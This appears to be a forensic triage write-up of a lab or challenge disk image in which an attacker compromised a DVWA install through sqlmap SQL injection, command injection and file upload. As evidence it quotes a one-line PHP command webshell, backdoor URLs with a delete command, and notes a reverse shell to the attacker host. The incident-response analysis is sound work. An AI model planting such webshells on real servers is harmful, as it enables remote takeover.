# Disk triage — s2cb906

Evidence source: `inputs/s4a-challenge4` (25 GB raw disk, single NTFS volume at offset 2048).
Commands used: `mmls`, `fsstat -o 2048`, `fls -r -p -o 2048`, `fls -r -p -l -m / -o 2048`,
`icat -o 2048`. Full listing in `work/filelist.txt` (68332 lines), full mactime bodyfile in
`work/bodyfile.txt` (134075 lines). Volume map in `work/partitions.md`.

## 1. Machine fingerprint

- **Windows Server 2008 Standard SP1 (build 6001), 32-bit x86 PAE** (per Volatility
  `windows.info` on `inputs/memdump.mem`; hostname `WIN-L0ZZQ76PMUF`). Disk layout is the
  Vista/2008 profile: `bootmgr`, `Boot\`, `ProgramData\`, `Users\`, `Documents and Settings`
  junction, `PerfLogs\`, `$Recycle.Bin\`, `inetpub\`. (Not Windows 7 — corrected.)
- IIS present (`inetpub\history\...\applicationHost.config`) but the *active* web stack is
  **XAMPP** at `xampp\` (Apache + MySQL + PHP), installed from
  `Users\Administrator\Desktop\xampp-win32-5.6.11-1-VC11-installer.exe`
  (crtime 2015-08-24).
- **DVWA** (Damn Vulnerable Web Application) installed at `xampp\htdocs\DVWA\`
  (`config.inc.php`: MySQL `root`, empty password, DB `dvwa`, default security "high").

## 2. The attack (from `xampp\apache\logs\access.log`, inode 59684, 7716 lines)

Victim web server = `192.168.56.101`; **attacker = `192.168.56.102`** (Kali Linux —
UA `Mozilla/5.0 (X11; Linux ...; rv:31/38) ... Iceweasel/31.4/38.2`). Log timestamps are
`-0700` (PDT); the box clock runs PDT. FS timestamps below are converted to PDT for
consistency (`date -u` + 7h).

Key requests (attacker `192.168.56.102`):

| Time (PDT) | Request | Meaning |
|---|---|---|
| 23/Aug 15:24–15:25 | `GET /`, `/dvwa/login.php`, `POST /dvwa/login.php` (x4) | initial recon + DVWA login (brute) |
| 02/Sep 01:43 | `POST /dvwa/setup.php` | created DVWA MySQL DB (`xampp\mysql\data\dvwa\*` crtime 02/Sep) |
| 02/Sep 01:44–23:46 | many `POST /dvwa/vulnerabilities/xss_s/`, `captcha/`, `exec/` | exploited **XSS (stored)** and **command injection (exec)** |
| 02/Sep 04:20–04:25 | `sqlmap/1.0-dev-nongit-20150902` UNION + time-based SQLi on `/dvwa/vulnerabilities/sqli/` | **sqlmap** SQL-injection exploitation |
| 02/Sep 04:25:53 | `POST /tmpukudk.php` (200, 25 B, UA `Python-urllib/2.7`) | sqlmap `--os-shell`/file-write backdoor call |
| 02/Sep 23:52:24 | sqlmap `INTO OUTFILE '/xampp/htdocs/tmpudvfh.php'` writes **sqlmap file-uploader** backdoor; `POST /tmpudvfh.php` | sqlmap file-uploader (payload literally contains "sqlmap file uploader") |
| 02/Sep 23:59:38 | `GET /tmpbrjvl.php?cmd=del /F /Q ...tmpudvfh.php ...tmpbrjvl.php` | attacker **cleaned up** the sqlmap backdoors |
| 03/Sep 00:10:15 | `POST /dvwa/vulnerabilities/upload/` | uploaded `phpshell.php` |
| 03/Sep 00:14:48 | (file write) `webshells.zip` | uploaded webshell archive |
| 03/Sep 00:14:51–57 | (file write) `webshells/`, `webshell.php`, `c99.php` | extracted webshells |
| 03/Sep 00:17:58 | (file write) `hackable/uploads/abc/` dir | attacker file-system activity |
| 03/Sep 00:20:14 | (file write) `Temp/c99 (2).php` (now deleted) | second c99 copy |
| 03/Sep 00:21:28, 00:21:37 | `POST /dvwa/c99.php?act=cmd` | **used c99 webshell for command execution** |
| 03/Sep 00:31:30 | `POST /dvwa/vulnerabilities/upload/` | uploaded `phpshell2.php` (reverse shell) |

`/tmpukudk.php`, `/tmpudvfh.php`, `/tmpbrjvl.php` are no longer present in the active file
tree — the attacker deleted them (`del /F /Q`) at 02/Sep 23:59:38 (access.log). See §4.

## 3. Type of attack (summary for report)

Web-application attack against XAMPP-hosted DVWA: the attacker authenticated to DVWA, lowered
its security level, then abused **SQL injection** (automated with **sqlmap 1.0-dev**, incl.
`SELECT ... INTO OUTFILE` to write a PHP file-uploader backdoor), **command injection (exec)**,
**stored/reflected XSS**, and **unrestricted file upload** to drop PHP webshells (`phpshell.php`
= `<?php system($_GET["cmd"]);?>`, the **c99 shell**, and `phpshell2.php` = a PHP **reverse TCP
shell** to `192.168.56.102:4545`). The "shellcode" is therefore **PHP web-shell code**, not
native binary shellcode (no nc.exe/mimikatz/meterpreter found; `malfind` shows only false-positive
jmp-table pages). This is a classic "DVWA → sqlmap os-shell → webshell" compromise.

## 4. Attacker-added files/directories (BONUS) — with proof

All created during the attack window; inodes 62330–62338 are contiguous (sequential MFT
entries). Times = crtime (birth) unless noted, in PDT.

| Path | Inode | Size | crtime (PDT) | Hash (MD5 / SHA1) | Proof |
|---|---|---|---|---|---|
| `xampp/htdocs/DVWA/hackable/uploads/phpshell.php` | 62330 | 31 | 03/Sep 00:10:15 | `3f64cb2915e30a41e8287e978f59dd07` / `96de0b8897a4f92eaa9e2d67786021c5cbc55db7` | content `<?php system($_GET["cmd"]);?>`; matches `POST /dvwa/vulnerabilities/upload/` 03/Sep 00:10:15 |
| `xampp/htdocs/DVWA/webshells.zip` | 62331 | 42095 | 03/Sep 00:14:48 | `147ded74a67ea18edc99bdbf2ffd1e45` / `c9b1f08df91d8583660ebacb3393c503b15fa3a5` | zip contains `c99.php` (153275 B) + `webshell.php` (31 B) |
| `xampp/htdocs/DVWA/webshells/` (dir) | 62332 | — | 03/Sep 00:14:51 | — | empty dir, extracted-archive remnant |
| `xampp/htdocs/DVWA/c99.php` | 62333 | 156208 | 03/Sep 00:14:51 | `86a5679e047b1629832a4cbd89d5ebb7` / `70767616174e17d7b926272a6c9e13b174e9f897` | c99shell v1.0 beta (21.05.2005) header; used via `?act=cmd` 03/Sep 00:21 |
| `xampp/htdocs/DVWA/webshell.php` | 62334 | 31 | 03/Sep 00:14:57 | `5594112b531660654429f8639322218b` / `2256ccfeaaa8f27f0e06e01071ec4d6abc32df81` | `<?php system($_GET["cmd"]);?>` |
| `xampp/htdocs/DVWA/hackable/uploads/abc/` (dir) | 62335 | — | 03/Sep 00:17:58 | — | empty dir |
| `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php` | 62337 | 945 | 03/Sep 00:31:30 | `49dcdebd124d035463b18d8fb17999b2` / `b7c9c531a63d0fd6ba952cefbaf42fe68d4e7ff6` | PHP reverse shell to `192.168.56.102:4545` |
| `Users/Administrator/AppData/Local/Temp/c99 (2).php` (deleted) | 62338 | 153275 | 03/Sep 00:20:14 | — | deleted; same size as `webshells.zip`'s c99.php |
| `Users/Administrator/data.txt` | 60464 | 5 | 02/Sep 02:32:42 | `5d41402abc4b2a76b9719d911017c592` (md5 of "hello") | content `hello` — attacker command-injection write test |
| `/tmpukudk.php`, `/tmpudvfh.php`, `/tmpbrjvl.php` (web root) | deleted (not in MFT) | — | 02/Sep 04:25 / 23:52 | — | seen only in `access.log`; `tmpudvfh.php` = **sqlmap file-uploader** (decoded payload contains "sqlmap file uploader"), `tmpbrjvl.php` = cmd backdoor (`?cmd=`), then `del /F /Q` cleanup 02/Sep 23:59 |

Non-attacker (excluded): `Users\Administrator\AppData\Local\Temp\ad_driver.sys` (inode 60402)
is the **AccessData FTK Imager memory/disk driver** (v2.13, "AccessData Memory and Disk
driver") — a responder/imaging tool, not attacker malware. Its crtime is 1441274645 =
2015-09-03 10:04:05 UTC, which is exactly the memory-dump SystemTime reported by
`vol windows.info`, confirming FTK Imager loaded this driver when `memdump.mem` was captured.
`Administrator.bmp` is the Windows account tile cache.

## 5. Artifacts extracted for further analysis (`work/extracted/`)

`c99.php`, `phpshell.php`, `phpshell2.php`, `webshell.php`, `webshells.zip`, `data.txt`,
`ad_driver.sys`, `access.log`, `error.log`, `config.inc.php`, `DVWA_htaccess`.
